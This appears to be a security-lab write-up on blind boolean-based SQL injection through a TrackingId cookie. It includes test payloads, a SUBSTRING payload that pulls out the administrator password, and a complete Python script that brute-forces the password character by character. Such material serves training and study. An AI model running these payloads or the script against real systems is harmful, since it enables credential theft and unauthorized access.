In this lab `Tracking Id` cookie is  vulnerable to `SQL Injection`.

You can check this using the following statements sending them with the value of `tracking id`: 
```sql
' AND '1'='1     #This will print "Welcome Back"
' AND '1'='2     #This will not print "Welcome Back"
```

We can systematically determine the password for the  given user `administrator` by sending a series of inputs to test the password one character at a time.
```sql
' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 'char
```

You can use the following script to find the password:
```python
import sys
import requests
import string 
import time

if len(sys.argv) != 2:
    print(f"USAGE: {sys.argv[0]} domain")
    sys.exit(1)

URL = sys.argv[1]

dic = string.ascii_letters+string.digits
response = requests.get(URL)
tracking_id = response.cookies["TrackingId"]
sess_cookie = response.cookies["session"]

def password(url):
    
    pwd = ""
    i = 1
    while(True):
        found_char = False
        print(f"Index : {i}")
        for d in dic:
            payload = tracking_id + "' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), "+str(i)+", 1) = '" +d
            response = requests.get(URL, headers={"Cookie":"TrackingId="+payload+"; session="+sess_cookie})
            if "Welcome back!" in response.text:
                pwd += d
                print(pwd)
                found_char = True
                break
            time.sleep(1)
        i+=1
    
        if not found_char:
            print("Password : ",pwd)
            break

password(URL)
```
